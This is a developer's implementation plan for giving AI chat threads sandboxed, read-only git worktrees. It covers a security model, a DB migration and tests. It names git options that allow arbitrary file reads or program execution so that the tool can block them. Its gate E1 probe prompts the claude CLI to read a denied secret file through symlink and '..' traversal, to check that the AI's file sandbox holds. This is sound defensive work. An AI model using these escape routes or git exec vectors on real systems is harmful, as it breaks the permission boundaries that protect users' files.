# Ask Worca Worktrees (P4) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ask Worca chat threads can open read-only detached git worktrees of any registered project ref (or a run's feature branch), navigate/diff them with a scoped `git` MCP tool and native Read/Grep/Glob, with per-thread persistence, cascade delete, boot sweep, and a chat-panel worktrees popover with manual delete.

**Architecture:** Git primitives extend the DB-free `src/core/worktree.mjs`; a new `src/core/ask/worktrees.mjs` owns the `ask_worktrees` registry rows, path construction, caps and the sweep; a new write-capable `worktree-deps.mjs` bundle feeds four new MCP tools in `tools.mjs` (kept write-free itself); `spawn.mjs` grants `Read/Grep/Glob` allow-scoped to `<worcaHome>/ask/<threadId>/wt/**` by replacing the blanket home deny with enumerated denies; the server wires cascade + endpoints; the panel adds an "N worktrees" popover.

**Security model (the git tool is the ONLY file-access surface not governed by permission rules — it must self-enforce D3):** the `git` tool is defended in four layers, because a git subcommand can read or execute arbitrary files far outside the worktree. (1) `git-allowlist.mjs` is an allow-list of subcommands with a global argument blocklist that now also rejects the arbitrary-read / arbitrary-exec options empirically demonstrated during planning — `--no-index`, `--contents`, `-f`/`--file`, `--filters`, `--color`, and any `-O…` (short `--open-files-in-pager`, which `key()` cannot normalise). (2) The runner spawns git with a hardened env (`GIT_PAGER=cat`, `GIT_TERMINAL_PROMPT=0`, `GIT_ASKPASS=`/`SSH_ASKPASS=`) so a credential prompt can never hang the turn, and the handler PREPENDS trusted `-c diff.external= -c color.ui=never …` plus `--no-ext-diff --no-color` on patch-producing subcommands so a hostile registered repo's `.git/config` (or the operator's `~/.gitconfig`, whose `HOME` survives the env scrub) cannot run an external-diff program. (3) Output is filtered by what git ACTUALLY emitted, not by subcommand name: patch output (detected by a real `diff --git` header — `diff`, `show <commit>`, `log -p`) passes the `get_run_diff` protected-path SECTION filter; path-list output (`grep`, `ls-files`, `ls-tree`) passes a LINE filter that drops any line naming a protected path; a command that NAMES a protected file (`blame .env`, `show HEAD:.env`, `log -p -- .env`) is rejected at INPUT; and a `show` that produced no patch resolved to a raw blob/tree — rejected, which also closes the `ls-tree → blob-sha → show <sha>` leg that no path inspection can catch. (4) `cat-file` is removed from the read tier entirely (a pure raw-content read); files are read by checking out the ref and using native `Read` inside the worktree. Native `Read`/`Grep`/`Glob` are gated by empirical gate E1, which is extended to prove symlinks and `..` cannot escape the worktree subtree.

**Tech Stack:** Node ≥ 22 (`node:sqlite`, `node:test`), Express server in `ui/server.mjs`, vanilla-DOM panel in `ui/public/ask-panel.mjs`, headless `claude` CLI (pinned behavior probed on 2.1.239).

**Spec:** `docs/superpowers/specs/2026-08-24-ask-worca-worktrees-design.md` (UNTRACKED — read it from the working dir; it is not in git).

## Global Constraints

- NEVER `git add` anything under `docs/superpowers/**` — plans and specs stay untracked (user rule). Commit only source/test/doc files named in each task.
- Worktrees are always DETACHED (`--detach`); no branch is ever created, locked or deleted by chat worktrees (spec D4).
- The agent never reads or runs anything in live project dirs; only server-side create/remove primitives run git with cwd = projectDir (spec D3).
- `tools.mjs` stays write-free (existing scan test `test/ask-tools.test.mjs:655` must keep passing untouched); all write-capable deps live in the new `worktree-deps.mjs`.
- Permission path rules are `//` or `~/` anchored; `worcaHome()` is never interpolated into a rule; the only interpolated value is a shape-checked `ask_[0-9a-f]{8}` thread id (spec §6).
- Caps: 5 worktrees/thread, 15 global, constants in `ASK_LIMITS` (spec D9).
- ID shapes: thread `ask_[0-9a-f]{8}` (the store mints this), worktree `wt_[0-9a-f]{8}`. NOTE the shared `ASK_ID_RE` at `store.mjs:14` is the LOOSER `/^[a-z]+_[0-9a-f]{8}$/` (it validates any `<lowercase>_<8hex>` id, which is why `askIdParam` accepts a `wt_` id too). So `worktreesDir` and `askWorktreeAllowRules` re-check with their own `ask_`-anchored literal `/^ask_[0-9a-f]{8}$/` before a thread id reaches a path or a permission rule.
- New DB schema version is **20** (current `SCHEMA_VERSION` is 19 at `src/core/db.mjs:54`); DDL is `IF NOT EXISTS` + a `schemaGaps()` flag (the `ask_cost_ledger` precedent).
- Timestamps in `ask_worktrees` are TEXT ISO strings (matches every other `ask_*` table; deliberate deviation from the spec's INTEGER sketch).
- All commits: `worca: Ask Worca Worktrees — <short description>`.
- Run tests as `npm test` for the full suite, or `node --test test/<file>` for one file. Baseline before Task 1: full suite green (**3397 tests measured on `b9c77d70`, 2026-08-24** — record the actual number in Task 0; the earlier "≈3369" estimate was stale). The full plan adds ~31 behavioural tests plus the mutation-audit tests this v2 bakes in; the exact end total is recorded in Task 10.

---

### Task 0: Branch, baseline, empirical gate E1

**Files:**
- No repo files change. Gate results recorded in `docs/superpowers/plans/2026-08-24-ask-worca-worktrees-gates.md` (untracked, never committed).

**Interfaces:**
- Produces: the branch `worca-cc/ask-worca-worktrees-p4`, the recorded baseline test count, and the E1 verdict that Task 6 consumes (`GATE E1: PASS | GREP-RULED | READ-ONLY`).

- [ ] **Step 1: Create the branch off the current HEAD**

```bash
cd /Users/denislavprinov/Develop/worca-cc
git checkout -b worca-cc/ask-worca-worktrees-p4
```

- [ ] **Step 2: Ensure deps and record the baseline**

```bash
[ -d node_modules ] || npm ci
npm test 2>&1 | tail -5
```

Expected: full pass, 0 failures. Write the exact pass count into the gates file (create it) as `BASELINE: <n> tests green` — it is **3397** on `b9c77d70` (measured 2026-08-24; the earlier "≈3369" was stale). If ANY test fails, STOP — the baseline must be green before this plan starts (the suite has been green since 2026-08-17).

- [ ] **Step 3: Gate E1 — do Grep/Glob honor path allow/deny scoping under dontAsk?**

Run this probe (costs a few cents; needs the `claude` CLI on PATH):

The probe now has FIVE tasks: the original allow/deny/Grep triple, PLUS a symlink-escape and a `..`-traversal case. This addition is load-bearing — permission engines match the **literal argument string** while the filesystem resolves symlinks and `..`, so a checked-out repo containing `wt/<id>/esc -> ~/.ssh` (or a `../../../store` traversal) can read a denied target through an allowed path. The original probe tested only direct paths and never proved this could not happen; a `PASS` on the triple alone is NOT evidence the native-Read model is safe.

```bash
E1=/tmp/worca-e1; rm -rf "$E1"
mkdir -p "$E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001" "$E1/home/.worca-cc/store" "$E1/scratch"
echo "WT-INSIDE-MARKER" > "$E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001/inside.txt"
echo "STORE-SECRET-MARKER" > "$E1/home/.worca-cc/store/secret.txt"
echo "NEUTRAL-MARKER" > "$E1/scratch/neutral.txt"                                            # in NEITHER list
# escape vectors, both reachable via the allowed wt/** prefix:
ln -s "$E1/home/.worca-cc/store" "$E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001/esc"   # symlink out
cd "$E1/scratch"
claude -p "Six tasks, report each outcome verbatim, do not stop on errors: (1) Read $E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001/inside.txt (2) Read $E1/home/.worca-cc/store/secret.txt (3) Use Grep to search for SECRET-MARKER under $E1/home and report every match (4) Read $E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001/esc/secret.txt (5) Read $E1/home/.worca-cc/ask/ask_00000001/wt/wt_00000001/../../../../store/secret.txt (6) Read $E1/scratch/neutral.txt" \
  --permission-mode dontAsk --tools Read,Grep,Glob --allowedTools Read,Grep,Glob \
  --setting-sources project \
  --settings "{\"permissions\":{\"allow\":[\"Read(//**/.worca-cc/ask/ask_00000001/wt/**)\"],\"deny\":[\"Read(//**/.worca-cc/store/**)\"]}}"
```

**Task (6) is the load-bearing sanity check for the whole restructure:** `$E1/scratch/neutral.txt` is in neither the allow nor the deny list. Removing the blanket `Read(//**/.worca-cc/**)` deny is only safe if `dontAsk` AUTO-DENIES an unmatched path — otherwise every other thread's `wt/**` and the entire rest of the disk become readable and no enumerated deny can cover it (a general `ask/*/wt/**` deny would kill the own-thread allow, deny-beats-allow). If (6) reads `NEUTRAL-MARKER`, **STOP**: unmatched⇒allow, the blanket deny CANNOT be dissolved — either keep the blanket deny (verdict `READ-ONLY-STRICT`, git-tool-only file access), or the whole permission design needs re-probing. If (6) is denied (expected — the spawn.mjs comment claims dontAsk auto-denies), the enumerated-denies restructure is sound.

Read the transcript and decide (evaluate the escape rows FIRST — they override the Grep verdict):

| Observation | Verdict (write into the gates file) | Task 6 consequence |
|---|---|---|
| (4) OR (5) reads `STORE-SECRET-MARKER` (symlink or `..` escapes the allowed subtree) | `GATE E1: READ-ONLY-STRICT` | native Read/Grep/Glob are UNSAFE — ship `['Task']` only; file access is ONLY the hardened `git` tool (which is cwd-confined and passes the protected-path floor) plus, optionally, a server-side `read_worktree`/`search_worktree` MCP tool that `realpath`s the path and asserts containment under `<worcaHome>/ask/<tid>/wt/`. `git grep`/`git ls-files` remain available but are now the sole search path, so the Task 5 redaction hardening (C1/C2/C3) is load-bearing, not defence-in-depth. |
| (4)+(5) blocked, (1) read OK, (2) denied, (3) Grep does NOT surface `STORE-SECRET-MARKER` | `GATE E1: PASS` | ship `['Task','Read','Grep','Glob']` with the single Read allow rule |
| (4)+(5) blocked, (3) leaks the store marker, but re-running with `"deny":[...,"Grep(//**/.worca-cc/store/**)"]` and `"allow":[...,"Grep(//**/.worca-cc/ask/ask_00000001/wt/**)"]` confines Grep | `GATE E1: GREP-RULED` | Task 6 emits per-tool rules: `askWorktreeAllowRules` returns Read+Grep+Glob variants, and every `Read(...)` deny gets Grep **and** Glob twins (a Glob of `store/**` still enumerates filenames = a metadata leak, so the Glob twins are required, not optional) |
| (4)+(5) blocked, Grep roams regardless of rules | `GATE E1: READ-ONLY` | Task 6 ships `['Task','Read']`; the prompt rule points the model at `git grep` / `git ls-files` (already in the tool allowlist) instead — no extra MCP search tool. Same load-bearing caveat as READ-ONLY-STRICT: the Task 5 redaction hardening is what keeps `git grep` from leaking. |

Also confirm (1)+(2) behave as expected in all cases; if Read itself ignores the allow/deny shape, STOP and report — the whole permission design needs re-probing before any code is written. Whatever the verdict, add a one-line note that the create path should reject or relativise a symlink that points outside its worktree (belt-and-braces; the checkout is read-only, but a future writable path must not resurrect this).

*(Gate E2 is settled by code already read: `SPAWN_ENV_BASE` in `src/core/claude-runner.mjs:148` keeps `PATH` and `HOME` under scrub, so git resolves in the MCP child. Gate E3 (fetch credentials): the same base keeps `HOME`, so the macOS keychain credential helper works for https remotes; SSH remotes lack `SSH_AUTH_SOCK`, so per spec §12 E3 it is allowlisted in Task 6 — with the deliberate deviation that the spec said "into the MCP child only" while Task 6 grants it on `buildAskSpawnOptions.envAllowlist` (the whole `claude` process), acceptable because there is no `Bash`/sub-shell to leak it to (locked decision D12). Run a one-line smoke — `env -i PATH="$PATH" HOME="$HOME" SSH_AUTH_SOCK="$SSH_AUTH_SOCK" git ls-remote <some-ssh-remote>` — and record whether it authenticates, so the "fetch degrades to public remotes" fallback is a measured outcome, not an assumption. A private-remote fetch that still fails surfaces git's stderr as a clean tool error, and `GIT_TERMINAL_PROMPT=0` (Task 2) means it fails fast instead of hanging.)*

- [ ] **Step 4: No commit** (nothing tracked changed).

---

### Task 1: DB v20 — `ask_worktrees` table

**Files:**
- Modify: `src/core/db.mjs` (SCHEMA_VERSION at :54, DDL consts near :607-622, `schemaGaps()` at :658-694, `repairSchemaGaps()` at :698-708, `reconcileSchema()` condition at :721-725, ladder at :918-920)
- Test: `test/ask-worktrees-schema.test.mjs` (create)

**Interfaces:**
- Consumes: existing `getDb()/prepare()` from `src/core/db.mjs`, `useTempHome` from `test/helpers/temp-home.mjs`.
- Produces: table `ask_worktrees(id, thread_id, project_key, project_dir, ref, resolved_commit, run_id, worktree_dir, created_at, updated_at)` with `thread_id` FK → `ask_threads ON DELETE CASCADE`; later tasks read/write it via `prepare()`.

- [ ] **Step 1: Write the failing test**

```js
// test/ask-worktrees-schema.test.mjs
// P4/T1: the v20 ask_worktrees table (ask-worca-worktrees-design.md §4) —
// columns, FK cascade wiring, version stamp, and the schemaGaps self-heal flag.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { useTempHome } from './helpers/temp-home.mjs';
import { getDb, prepare } from '../src/core/db.mjs';

useTempHome(after);

test('v20: ask_worktrees exists with the spec columns and cascades from ask_threads', () => {
  getDb();
  const cols = prepare('PRAGMA table_info(ask_worktrees)').all().map((c) => c.name);
  assert.deepEqual(cols, ['id', 'thread_id', 'project_key', 'project_dir', 'ref',
    'resolved_commit', 'run_id', 'worktree_dir', 'created_at', 'updated_at']);
  const fk = prepare('PRAGMA foreign_key_list(ask_worktrees)').all()[0];
  assert.equal(fk.table, 'ask_threads');
  assert.equal(fk.on_delete, 'CASCADE');
  assert.ok(prepare('PRAGMA user_version').get().user_version >= 20);
  const idx = prepare("SELECT name FROM sqlite_master WHERE type='index' AND tbl_name='ask_worktrees'").all().map((r) => r.name);
  assert.ok(idx.includes('idx_ask_worktrees_thread'));
});

```

Self-heal coverage lands in **Step 4b** (the ladder + `reconcileSchema` fast-path tests), which pin the two migration seams the fresh-path test above cannot. Read `test/ask-db-schema.test.mjs` first for its existing `schemaGaps()`/`reconcileSchema()` heal tests (v18/v19 ask tables, drop-and-reopen) and reuse the SAME seam — do not invent a new reset mechanism; the `ask_worktrees` DDL follows the `ask_cost_ledger` `IF NOT EXISTS` + flag pattern exactly.

- [ ] **Step 2: Run it to verify it fails**

Run: `node --test test/ask-worktrees-schema.test.mjs`
Expected: FAIL — `ask_worktrees` has no columns (`deepEqual` against `[]`).

- [ ] **Step 3: Implement the migration**

In `src/core/db.mjs`:

1. `const SCHEMA_VERSION = 20;` (line 54).
2. After `ASK_COST_LEDGER_DDL` (≈line 622) add:

```js
/** v20: Ask Worca worktrees — per-thread detached git checkouts
 *  (ask-worca-worktrees-design.md §4). IF NOT EXISTS + a schemaGaps flag (the
 *  ask_cost_ledger precedent): reconcile-safe on divergent-stamp DBs. The git
 *  state lives on disk under <worcaHome>/ask/<threadId>/wt/<id>; these rows are
 *  the registry the cascade, the sweep and the UI read. */
const ASK_WORKTREES_DDL = `
CREATE TABLE IF NOT EXISTS ask_worktrees (
  id              TEXT PRIMARY KEY,          -- 'wt_' + 8 hex
  thread_id       TEXT NOT NULL REFERENCES ask_threads(id) ON DELETE CASCADE,
  project_key     TEXT NOT NULL,
  project_dir     TEXT NOT NULL,             -- source repo at creation time
  ref             TEXT NOT NULL,             -- last ref the model checked out (label)
  resolved_commit TEXT NOT NULL,             -- HEAD sha after the last navigation
  run_id          TEXT,                      -- set when created via run-id sugar
  worktree_dir    TEXT NOT NULL,
  created_at      TEXT NOT NULL,
  updated_at      TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_ask_worktrees_thread ON ask_worktrees (thread_id);
`;
```

3. In `schemaGaps()` add the probe + return-flag alongside `hasAskCostLedger`:

```js
  const hasAskWorktrees = db.prepare(
    "SELECT count(*) AS n FROM sqlite_master WHERE type='table' AND name='ask_worktrees'"
  ).get().n > 0;
```
and `askWorktreesTable: !hasAskWorktrees,` in the returned object.

4. In `repairSchemaGaps()`: `if (gaps.askWorktreesTable) db.exec(ASK_WORKTREES_DDL);`
5. In `reconcileSchema()`'s early-return condition add `&& !gaps.askWorktreesTable`.
6. In the ladder (after `if (current < 19) …`): `if (current < 20) db.exec(ASK_WORKTREES_DDL);  // IF NOT EXISTS — reconcile-safe`

- [ ] **Step 4: Re-point every `user_version` pin from 19 to 20 (the plan's single biggest blind spot)**

The v20 bump breaks **~48 hard `user_version === 19` assertions across 16 files** — not the 2–3 the v1 plan hinted at (measured: bumping `SCHEMA_VERSION` alone turns the suite red with ~40 failures). Find them all:

```bash
grep -rn -A1 "user_version" test/*.mjs | grep -w 19
```

The 16 files: `test/ask-db-schema.test.mjs`, `test/db.test.mjs`, `test/db-pause-schema.test.mjs` (the ALIASED pin: `const v = …user_version; assert.equal(v, 19)` at :22-23 — the memory-noted "18-pin" is now a 19-pin), `test/migrate-v10.test.mjs`, `-v12`, `-v13`, `-v14`, `-v15` (two test *names* too), `-v16`, `-v19`, `test/subagent-migration.test.mjs`, `-v3`, `-v6`, `-v7`, `-v8`, `test/upgrade-integration.test.mjs`.

Update **all** of them — these are version PINS, not behaviour:
- every `…user_version, 19` / `assert.equal(…, 19)` / `assert.equal(v, 19)` → `20`;
- the test *names/messages* that say "19" (e.g. `db.test.mjs:137`, `migrate-v15.test.mjs:27`, `ask-db-schema.test.mjs:23`) → "20";
- **CRITICAL — the FIVE "stamped current" SEEDS** `db.exec('PRAGMA user_version = 19')` (at `ask-db-schema:48`, `migrate-v12:94`, `migrate-v13:68`, `migrate-v14:62`, `migrate-v19:143`) must become `= 20`. These seed a DB "already at the current version so the ladder no-ops / `reconcileSchema` fast-path runs". Left at 19, a stamped-19 DB now takes the **ladder** (19 < 20) instead of the fast path, so the test passes while silently testing the wrong branch — a **false green**, not a failure. A `PRAGMA user_version = 19` whose comment says "stamped current"/"divergent" is fixture, not a pin.

Run: `node --test test/ask-worktrees-schema.test.mjs test/ask-db-schema.test.mjs test/db.test.mjs test/db-pause-schema.test.mjs test/migrate-v1{0,2,3,4,5,6,9}.test.mjs test/subagent-migration*.test.mjs test/upgrade-integration.test.mjs 2>&1 | tail -3`
Expected: PASS. (The `db.test.mjs` `EXPECTED_TABLES`/`EXPECTED_INDEXES` checks are **subset** loops, so the new table needs no addition there — only the version pins break.) After the fix, `grep -rn -A1 "user_version" test/*.mjs | grep -w 19` must return nothing but the deliberate `= 19` seed of the new v19→v20 ladder test in Step 4b.

- [ ] **Step 4b: Add the migration-ladder mutation-audit tests** (into `test/ask-db-schema.test.mjs`, reusing its `DatabaseSync(':memory:')` + `migrate`/`tableNames`/`indexNames` helpers — read the file for the exact names)

The fresh-path test in Step 1 does NOT pin the two migration seams: (a) removing the `if (current < 20)` ladder step SURVIVES (masked by `getDb`'s second open falling through to `reconcileSchema`), and (b) dropping `&& !gaps.askWorktreesTable` from the `reconcileSchema` early-return SURVIVES (the existing heal test's DB is missing the other ask tables too, masking it). Both were empirically confirmed to survive. Add:

```js
test('ladder: a v19 DB gets ask_worktrees and is stamped 20', () => {
  const db = new DatabaseSync(':memory:');
  db.exec(MINIMAL_SEED);                          // reuse this file's minimal-seed helper
  db.exec('PRAGMA user_version = 19');
  migrate(db);
  assert.equal(db.prepare('PRAGMA user_version').get().user_version, 20);
  assert.ok(tableNames(db).includes('ask_worktrees'), 'ask_worktrees created by the v20 ladder step');
  assert.ok(indexNames(db).includes('idx_ask_worktrees_thread'), 'index created by the ladder');
});

test('self-heal: a stamped-20 DB missing ONLY ask_worktrees is healed, stamp untouched', () => {
  const db = new DatabaseSync(':memory:');
  db.exec(MINIMAL_SEED);
  db.exec('PRAGMA user_version = 17');            // 17 -> 20: run the ask ladder steps
  migrate(db);
  db.exec('DROP TABLE ask_worktrees');
  assert.ok(!tableNames(db).includes('ask_worktrees'), 'precondition: only this table is missing');
  migrate(db);                                    // stamp is current -> reconcileSchema fast path
  assert.equal(db.prepare('PRAGMA user_version').get().user_version, 20, 'stamp not rewritten');
  assert.ok(tableNames(db).includes('ask_worktrees'), 'healed by reconcileSchema');
  assert.ok(indexNames(db).includes('idx_ask_worktrees_thread'), 'index healed');
});
```

Adapt the seed/helper names to whatever `test/ask-db-schema.test.mjs` already uses (`MINIMAL_SEED`, `migrate`, `tableNames`, `indexNames` are placeholders for its real seam). Run the file; both must pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/db.mjs test/ask-worktrees-schema.test.mjs \
  test/ask-db-schema.test.mjs test/db.test.mjs test/db-pause-schema.test.mjs \
  test/migrate-v10.test.mjs test/migrate-v12.test.mjs test/migrate-v13.test.mjs \
  test/migrate-v14.test.mjs test/migrate-v15.test.mjs test/migrate-v16.test.mjs \
  test/migrate-v19.test.mjs test/subagent-migration.test.mjs test/subagent-migration-v3.test.mjs \
  test/subagent-migration-v6.test.mjs test/subagent-migration-v7.test.mjs test/subagent-migration-v8.test.mjs \
  test/upgrade-integration.test.mjs
git commit -m "worca: Ask Worca Worktrees — v20 ask_worktrees table"
```

---

### Task 2: `worktree.mjs` — detached create, head, capture runner

**Files:**
- Modify: `src/core/worktree.mjs` (add three exports + `ASK_GIT_ENV` after `removeWorktree`, ≈line 319; AND thread an `env` option through the private `git()` runner at :52-57 — it currently spawns with no `env`, so the Ask git tool cannot disable the pager/prompt or neutralise a hostile `diff.external`)
- Test: `test/worktree.test.mjs` (append)

**Interfaces:**
- Consumes: the module's private `git()` runner, `isValidSourceRef`, `SLOW_GIT_TIMEOUT_MS`.
- Produces (exact signatures later tasks import):
  - `createDetachedWorktree({projectDir, worktreeDir, ref, signal}) → Promise<{worktreeDir, commit}>` (throws on invalid ref / git failure, `AbortError`-stamped on abort)
  - `worktreeHead(dir) → Promise<string|null>`
  - `runGitCapture(cwd, args, {signal, timeoutMs}) → Promise<{ok, stdout, stderr, code}>` (never throws)

- [ ] **Step 1: Write the failing tests** (append to `test/worktree.test.mjs`, reusing its `freshRepo()`/`created[]` helpers and existing imports; add `createDetachedWorktree, worktreeHead, runGitCapture, ASK_GIT_ENV` to the import list)

```js
test('createDetachedWorktree: detached HEAD at ref, no branch created, no branch lock, removable', async () => {
  const repo = await freshRepo();
  const g = (args) => spawnSync('git', args, { cwd: repo });
  g(['checkout', '-qb', 'feature']);
  await writeFile(join(repo, 'f.txt'), 'x\n');
  g(['add', '-A']); g(['commit', '-qm', 'feat']);
  g(['checkout', '-q', 'main']);
  const base = await mkdtemp(join(tmpdir(), 'worca-cc-dwt-'));
  created.push(base);
  const dir = join(base, 'wt_00000001');
  const { commit } = await createDetachedWorktree({ projectDir: repo, worktreeDir: dir, ref: 'feature' });
  assert.match(commit, /^[0-9a-f]{40}$/);
  assert.ok(existsSync(join(dir, 'f.txt')), 'feature files checked out');
  assert.notEqual(spawnSync('git', ['symbolic-ref', '-q', 'HEAD'], { cwd: dir }).status, 0, 'HEAD is detached');
  assert.deepEqual((await listLocalBranches(repo)).sort(), ['feature', 'main'], 'no branch created');
  assert.equal(await worktreePathForBranch(repo, 'feature'), null, 'feature is NOT locked by the detached checkout (M2 untouched)');
  assert.equal(await worktreeHead(dir), commit);
  const res = await removeWorktree({ projectDir: repo, worktreeDir: dir, branch: null, force: true });
  assert.ok(res.ok, JSON.stringify(res.steps));
  assert.ok(!existsSync(dir));
  assert.ok(!String(spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: repo }).stdout).includes('wt_00000001'), 'registration pruned');
});

test('createDetachedWorktree: unknown ref and option-injection are rejected before git worktree add', async () => {
  const repo = await freshRepo();
  const base = await mkdtemp(join(tmpdir(), 'worca-cc-dwt2-'));
  created.push(base);
  await assert.rejects(() => createDetachedWorktree({ projectDir: repo, worktreeDir: join(base, 'w1'), ref: 'no-such-ref' }), /not a valid commit-ish/);
  await assert.rejects(() => createDetachedWorktree({ projectDir: repo, worktreeDir: join(base, 'w2'), ref: '--force' }), /not a valid commit-ish/);
  await assert.rejects(() => createDetachedWorktree({ projectDir: repo, worktreeDir: join(base, 'w3') }), /not a valid commit-ish/);
  assert.equal(existsSync(join(base, 'w1')), false, 'nothing was created');
});

test('runGitCapture: plain capture, never throws, ASK_GIT_ENV hardening applied', async () => {
  const repo = await freshRepo();
  const ok = await runGitCapture(repo, ['rev-parse', 'HEAD']);
  assert.ok(ok.ok);
  assert.match(ok.stdout.trim(), /^[0-9a-f]{40}$/);
  const bad = await runGitCapture(repo, ['definitely-not-a-subcommand']);
  assert.equal(bad.ok, false);
  assert.ok(bad.stderr.length > 0);
  // the pager/prompt hardening reaches the child (else a credential-prompting
  // fetch hangs to the 120s SIGKILL):
  assert.deepEqual(Object.keys(ASK_GIT_ENV).sort(),
    ['GIT_ASKPASS', 'GIT_PAGER', 'GIT_TERMINAL_PROMPT', 'PAGER', 'SSH_ASKPASS']);
  const pager = await runGitCapture(repo, ['var', 'GIT_PAGER']);
  assert.equal(pager.stdout.trim(), 'cat', 'GIT_PAGER=cat reached the git child');
});

// Mutation-audit (empirically these three SURVIVED the v1 tests): the prune step,
// the throw-on-failure and the AbortError stamp were all un-pinned.
test('createDetachedWorktree: prunes a stale registration first, throws on git failure, stamps abort', async () => {
  const repo = await freshRepo();
  const base = await mkdtemp(join(tmpdir(), 'worca-cc-dwt3-'));
  created.push(base);
  const dir = join(base, 'wt_0000000a');
  // 1) a stale registration at the SAME path (dir removed behind git's back) —
  //    without the prune-before-add step the re-add fails "already registered".
  await createDetachedWorktree({ projectDir: repo, worktreeDir: dir, ref: 'main' });
  await rm(dir, { recursive: true, force: true });
  assert.ok(String(spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: repo }).stdout).includes('wt_0000000a'),
    'precondition: registration still present');
  const again = await createDetachedWorktree({ projectDir: repo, worktreeDir: dir, ref: 'main' });
  assert.match(again.commit, /^[0-9a-f]{40}$/, 'the prune let the re-add through');
  // 2) an occupied path is a THROW, never a {commit:null} success.
  await assert.rejects(() => createDetachedWorktree({ projectDir: repo, worktreeDir: dir, ref: 'main' }),
    /git worktree add --detach failed/);
  // 3) an aborted signal is named AbortError (isAbort classifiers depend on it).
  const ac = new AbortController(); ac.abort();
  await assert.rejects(
    () => createDetachedWorktree({ projectDir: repo, worktreeDir: join(base, 'wt_0000000b'), ref: 'main', signal: ac.signal }),
    (err) => { assert.equal(err.name, 'AbortError'); return true; });
});
```

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/worktree.test.mjs 2>&1 | tail -5`
Expected: FAIL — `SyntaxError: The requested module '../src/core/worktree.mjs' does not provide an export named 'createDetachedWorktree'` (an ESM missing-export names one of the newly-added bindings and fails the whole file to load; it is NOT a runtime "is not a function").

- [ ] **Step 3: Implement** (append after `removeWorktree` in `src/core/worktree.mjs`)

```js
/**
 * Create a DETACHED worktree at `worktreeDir` checking out `ref` — the Ask
 * Worca inspection checkout (ask-worca-worktrees-design.md §3). Detached by
 * construction: no branch is created, locked or deleted, so the pipeline
 * branch-in-use check (M2) never sees these. The caller (ask/worktrees.mjs)
 * owns path construction and containment; this validates only the ref (M1
 * doctrine: reject option-injection before git parses argv) and throws on a
 * fatal git failure with the same AbortError stamp createWorktree uses.
 */
export async function createDetachedWorktree({ projectDir, worktreeDir, ref, signal } = {}) {
  if (!projectDir) throw new Error('projectDir required');
  if (!worktreeDir) throw new Error('worktreeDir required');
  if (!(await isValidSourceRef(projectDir, ref))) {
    throw new Error(`ref is not a valid commit-ish: ${JSON.stringify(ref ?? null)}`);
  }
  await git(projectDir, ['worktree', 'prune']);
  const r = await git(projectDir, ['worktree', 'add', '--detach', '--', worktreeDir, ref],
    { signal, timeout: SLOW_GIT_TIMEOUT_MS });
  if (!r.ok) {
    const err = new Error(`git worktree add --detach failed: ${r.stderr.trim() || `exit ${r.code}`}`);
    if (signal?.aborted) err.name = 'AbortError';
    throw err;
  }
  const head = await git(worktreeDir, ['rev-parse', 'HEAD']);
  return { worktreeDir, commit: head.ok ? head.stdout.trim() : null };
}

/** HEAD commit sha of any checkout (worktree or repo), or null. */
export async function worktreeHead(dir) {
  const r = await git(dir, ['rev-parse', 'HEAD']);
  return r.ok ? r.stdout.trim() : null;
}

/**
 * Env for every Ask Worca git spawn (spec §8). Pager OFF and — load-bearing —
 * NEVER prompt: an https/ssh fetch with no cached credential would otherwise
 * block on a terminal/askpass prompt until the SLOW_GIT_TIMEOUT_MS SIGKILL,
 * holding the MCP call open for two minutes. GIT_ASKPASS/SSH_ASKPASS='' stop the
 * GUI askpass fallback too. NOTE we deliberately do NOT set GIT_CONFIG_GLOBAL:
 * the keychain credential helper for https fetch lives in the user's global
 * config (E3), so nuking it would break authenticated fetch; the external-diff
 * exec vector is closed per-invocation in the tool handler (Task 5) with
 * `-c diff.external=` + `--no-ext-diff` instead.
 */
export const ASK_GIT_ENV = Object.freeze({
  GIT_PAGER: 'cat', PAGER: 'cat', GIT_TERMINAL_PROMPT: '0', GIT_ASKPASS: '', SSH_ASKPASS: '',
});

/**
 * Raw capture runner for the Ask Worca `git` MCP tool. The ONLY gate between a
 * model-authored argv and this spawn is ask/git-allowlist.mjs — callers pass
 * exclusively its validated output. Spawn semantics identical to every other
 * helper here ({ok, stdout, stderr, code}, never throws), plus the ASK_GIT_ENV
 * hardening and the caller's abort signal.
 */
export function runGitCapture(cwd, args, { signal, timeoutMs = SLOW_GIT_TIMEOUT_MS } = {}) {
  return git(cwd, args, { signal, timeout: timeoutMs, env: ASK_GIT_ENV });
}
```

The private `git()` runner (≈:52-57) must gain an `env` passthrough — today it spawns with no `env` at all:

```js
function git(cwd, args, { signal, timeout = 30_000, env } = {}) {
  const child = spawn('git', args, { cwd, stdio: ['ignore', 'pipe', 'pipe'], signal,
    ...(env ? { env: { ...process.env, ...env } } : {}) });
  // …unchanged body…
}
```
(Merge over `process.env` so `PATH`/`HOME` — which the git binary and the keychain helper need — survive; the ASK_GIT_ENV keys override only pager/prompt/askpass.)

- [ ] **Step 4: Run tests**

Run: `node --test test/worktree.test.mjs 2>&1 | tail -3`
Expected: PASS, no other test in the file broken.

- [ ] **Step 5: Commit**

```bash
git add src/core/worktree.mjs test/worktree.test.mjs
git commit -m "worca: Ask Worca Worktrees — detached worktree primitives"
```

---

### Task 3: `git-allowlist.mjs` validator + `ASK_LIMITS` caps

**Files:**
- Create: `src/core/ask/git-allowlist.mjs`
- Modify: `src/core/ask/limits.mjs` (three keys inside the `ASK_LIMITS` literal)
- Test: `test/ask-git-allowlist.test.mjs` (create)

**Interfaces:**
- Produces: `validateGitArgs(rawArgs) → {ok:true, args:string[], nav:boolean, fetch:boolean} | {ok:false, error:string}` (pure, no imports); `ASK_LIMITS.worktreesPerThread === 5`, `ASK_LIMITS.worktreesGlobal === 15`, `ASK_LIMITS.gitOutputMaxBytes === 200_000`.
